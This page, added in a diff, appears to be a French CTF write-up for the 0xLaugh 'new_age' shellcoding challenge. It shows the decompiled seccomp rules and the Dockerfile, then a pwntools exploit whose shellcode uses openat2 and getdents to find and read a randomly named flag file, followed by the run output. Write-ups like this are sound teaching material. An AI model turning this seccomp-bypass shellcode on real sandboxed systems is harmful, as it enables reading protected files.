@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><title>New_age &ndash; Sk4r</title>
+
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta charset="UTF-8"/>
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.4/css/academicons.min.css" integrity="sha512-IW0nhlW5MgNydsXJO40En2EoCkTTjZhI3yuODrZIc8cQ4h1XcF53PsqDHa09NqnkXuIe0Oiyyj171BqZFwISBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+
+<link rel="stylesheet" href="https://sk4r-git.github.io/css/palettes/base16-dark.css">
+<link rel="stylesheet" href="https://sk4r-git.github.io/css/risotto.css">
+<link rel="stylesheet" href="https://sk4r-git.github.io/css/custom.css">
+
+
+
+
+
+
+
+
+
+<link rel="alternate" type="application/rss+xml" href="https://sk4r-git.github.io/ctf/0xlaugh_01_26/new_age/index.xml" title="Sk4r">
+
+
+
+<meta property="og:title" content="New_age &ndash; Sk4r" />
+<meta property="og:url" content="https://sk4r-git.github.io/ctf/0xlaugh_01_26/new_age/" />
+
+  
+
+<meta property="og:locale" content="fr-fr" />
+</head>
+
+<body>
+    <div class="page">
+
+        <header class="page__header"><nav class="page__nav main-nav">
+    <ul>
+      <li class="nomarker"><h1 class="page__logo"><a href="https://sk4r-git.github.io/" class="page__logo-inner">Sk4r</a></h1></li>
+    
+    
+    </ul>
+</nav>
+
+</header>
+
+        <section class="page__body">
+
+<h1>New_age</h1>
+
+<div class="attachments">
+  <a href="/ctf/0xlaugh_01_26">0xLaugh</a><br><br>
+  <a href="/ctf/0xlaugh_01_26/new_age/new_age">new_age</a><br>
+  <a href="/ctf/0xlaugh_01_26/new_age/solve.py">solve.py</a><br>
+</div>
+<p>Challenge de shellcoding avec des regles seccomp</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setup</span>(<span style="color:#66d9ef">void</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> lVar1;
+</span></span><span style="display:flex;"><span>  undefined8 uVar2;
+</span></span><span style="display:flex;"><span>  undefined8 in_R8;
+</span></span><span style="display:flex;"><span>  undefined8 in_R9;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  uVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">seccomp_init</span>(SCMP_ACT_ALLOW);
+</span></span><span style="display:flex;"><span>  lVar1 <span style="color:#f92672">=</span> code_region;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">seccomp_arch_remove</span>(uVar2,SCMP_ARCH_X86);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">seccomp_arch_remove</span>(uVar2,SCMP_ARCH_X32);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">seccomp_rule_add</span>(uVar2,<span style="color:#ae81ff">0</span>,READ,<span style="color:#ae81ff">1</span>,in_R8,in_R9,<span style="color:#ae81ff">0x200000001</span>,lVar1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xc00</span>,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">seccomp_rule_add</span>(uVar2,<span style="color:#ae81ff">0</span>,WRITE,<span style="color:#ae81ff">1</span>,in_R8,in_R9,<span style="color:#ae81ff">0x600000001</span>,lVar1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x400</span>,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">seccomp_rule_add</span>(uVar2,<span style="color:#ae81ff">0</span>,OPEN,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">seccomp_rule_add</span>(uVar2,<span style="color:#ae81ff">0</span>,OPENAT,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">seccomp_rule_add</span>(uVar2,<span style="color:#ae81ff">0</span>,EXECVE,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">seccomp_rule_add</span>(uVar2,<span style="color:#ae81ff">0</span>,EXECVEAT,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">seccomp_rule_add</span>(uVar2,<span style="color:#ae81ff">0</span>,FORK,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">seccomp_rule_add</span>(uVar2,<span style="color:#ae81ff">0</span>,VFORK,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">seccomp_rule_add</span>(uVar2,<span style="color:#ae81ff">0</span>,CLONE,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">seccomp_rule_add</span>(uVar2,<span style="color:#ae81ff">0</span>,CLONE3,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">seccomp_rule_add</span>(uVar2,<span style="color:#ae81ff">0</span>,SENDFILE,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">seccomp_rule_add</span>(uVar2,<span style="color:#ae81ff">0</span>,CHROOT,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">seccomp_rule_add</span>(uVar2,<span style="color:#ae81ff">0</span>,SOCKET,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">seccomp_rule_add</span>(uVar2,<span style="color:#ae81ff">0</span>,CONNECT,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">seccomp_load</span>(uVar2);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Le remove des archi 32 bits nous empeche de swap avec un int 0x80.
+Il nous reste tout de même openat2,
+Nous avons aussi le droit de lire vers code_region+0xc00
+Et d&rsquo;écrire depuis code_region+0x400
+Mais comme le laisse sous entendre le DockerFile le nom du fichier est random:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>FROM python:3.9-slim
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>RUN apt-get update <span style="color:#f92672">&amp;&amp;</span> apt-get install -y socat <span style="color:#f92672">&amp;&amp;</span> rm -rf /var/lib/apt/lists/*
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>WORKDIR /app
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>COPY new_age .
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>RUN useradd -m ctf
+</span></span><span style="display:flex;"><span>USER ctf
+</span></span><span style="display:flex;"><span>COPY flag_name_Should_Be_R@ndom_ahahahahahahahahah.txt .
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>EXPOSE <span style="color:#ae81ff">1337</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CMD socat TCP-LISTEN:1337,reuseaddr,fork EXEC:<span style="color:#e6db74">&#34;/app/new_age&#34;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>os <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;linux&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.att_syntax
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/**********************/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/* création du label &#39;code_region&#39; 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/* pour pouvoir le récuperer plus tard 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/* *********************/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">code_region:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/**********************/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/* openat2 du directory courant
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/*********************/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov $0x002e, </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">ax
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">push </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">ax
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">sp, </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">si       
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/* structure open_how */
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">sub $24, </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">sp
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">movq $0,  (</span><span style="color:#e6db74">%r</span><span style="color:#e6db74">sp)    
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">movq $0,  8(</span><span style="color:#e6db74">%r</span><span style="color:#e6db74">sp)      
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">movq $0, 16(</span><span style="color:#e6db74">%r</span><span style="color:#e6db74">sp)      
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">sp, </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">dx      
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov $24, </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">10     
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov $-100, </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">di    
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov $437, </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">ax       
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/*********************/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/* getdents pour avoir la 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/*liste de fichiers 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/*********************/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">ax, </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">di        
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">sub $0x400, </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">sp       
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">sp, </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">si        
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov $0x400, </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">dx
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov $217, </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">ax
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/********************/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/* openat2 du premier fichier 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/* avec une boucle pour iterer sur les 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/* differents nom de fichier
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/********************/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov $0, </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">9
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov $2, </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">10
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">loop:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movzwq 0x10(</span><span style="color:#e6db74">%r</span><span style="color:#e6db74">si), </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">cx
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    add </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">cx, </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">si
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    dec </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">10
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    cmp </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">9, </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">10   
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    jne loop
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">lea 0x13(</span><span style="color:#e6db74">%r</span><span style="color:#e6db74">si), </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">si   
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">bx, </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">di  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/* struct open_how */
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">sub $24, </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">sp
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">movq $0,  (</span><span style="color:#e6db74">%r</span><span style="color:#e6db74">sp)    
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">movq $0,  8(</span><span style="color:#e6db74">%r</span><span style="color:#e6db74">sp)   
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">movq $0, 16(</span><span style="color:#e6db74">%r</span><span style="color:#e6db74">sp)     
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">sp, </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">dx
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov $24, </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">10
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov $-100, </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">di
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov $437, </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">ax       
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/**************************/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/* récuperation de &#39;code_region&#39; 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/* et read du fichier vers 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/* code_region+0xc00
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/**************************/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">lea code_region(</span><span style="color:#e6db74">%r</span><span style="color:#e6db74">ip), </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">di
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">add $0xc00, </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">di
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">di, </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">si
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov $0x4, </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">di
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov $0x50, </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">dx
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov $0x0, </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">ax
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/*******************/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/* enorme write depuis
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/* code_region+0x400
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/*******************/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">lea code_region(</span><span style="color:#e6db74">%r</span><span style="color:#e6db74">ip), </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">di
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">add $0x400, </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">di
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">di, </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">si
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov $0x1, </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">di
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov $0x850, </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">dx
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov $0x1, </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">ax
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># io = process(&#34;./new_age&#34;)</span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> connect(<span style="color:#e6db74">&#34;159.89.106.147&#34;</span>, <span style="color:#ae81ff">1337</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(shellcode)
+</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvall(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> res<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0x&#34;</span>)[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0x&#34;</span> <span style="color:#f92672">+</span> res)
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>└─$ /home/sk4r/pwnenv/bin/python /home/sk4r/CTF/2026/OxLaugh/pwn_new_age/solve.py
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 159.89.106.147 on port 1337: Done
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Receiving all data: Done <span style="color:#f92672">(</span>2.16KB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed connection to 159.89.106.147 port <span style="color:#ae81ff">1337</span>
+</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#34;0xL4ugh{xxxxxxxxxxxxxxxxxxxxxxxx}\n\x00\x00\x00\x00\x00\x00\x00&#34;</span>
+</span></span></code></pre></div><p>Thx. Sk4r.</p>
+
+
+
+        </section>
+
+        <section class="page__aside">
+            <div class="aside__about">
+
+<ul class="aside__social-links">
+    
+</ul>
+</div>
+
+            <div class="aside__content">
+            </div>
+            <div class="aside__toc">
+                <nav id="TableOfContents"></nav>
+            </div>
+        </section>
+
+        <section class="page__leftside">
+            
+
+            
+
+<section class="page__leftside">
+    
+    <nav class="menu">
+        <ul>
+            
+            <li>
+                <a href="/ctf/">CTF</a>
+
+                
+                <ul>
+                    
+                        <li><a href="/ctf/ehax_02_26/">EHAX 02/26</a></li>
+                    
+                        <li><a href="/ctf/0xfun_02_26/">OxFun 02/26</a></li>
+                    
+                        <li><a href="/ctf/pascalctf_01_26/">PascalCTF 01/26</a></li>
+                    
+                        <li><a href="/ctf/0xlaugh_01_26/">0xLaugh 01/26</a></li>
+                    
+                        <li><a href="/ctf/scarletctf_01_26/">Scarlet CTF 01/26</a></li>
+                    
+                </ul>
+                
+
+            </li>
+            
+            <li>
+                <a href="/notes/">Notes</a>
+
+                
+                <ul>
+                    
+                        <li><a href="/notes/kernel/">A day in Kernel hacking</a></li>
+                    
+                        <li><a href="/notes/chall_syn_h2025/">Chall Synacktiv 12/25</a></li>
+                    
+                </ul>
+                
+
+            </li>
+            
+        </ul>
+    </nav>
+    
+</section>
+        </section>
+
+        <footer class="page__footer"><p>
+    
+    
+    
+    
+    
+    
+    
+    
+      
+      
+          
+            
+            
+                <br/><span class="active">$ echo $LANG<br/><b></b></span><br/>
+
+            
+          
+      
+    
+</p>
+<br /><br />
+<p class="copyright"></p>
+<p class="advertisement">Powered by <a href="https://gohugo.io/">hugo</a> and <a href="https://github.com/joeroe/risotto">risotto</a>.</p>
+</footer>
+
+    </div>
+</body>
+
+</html>
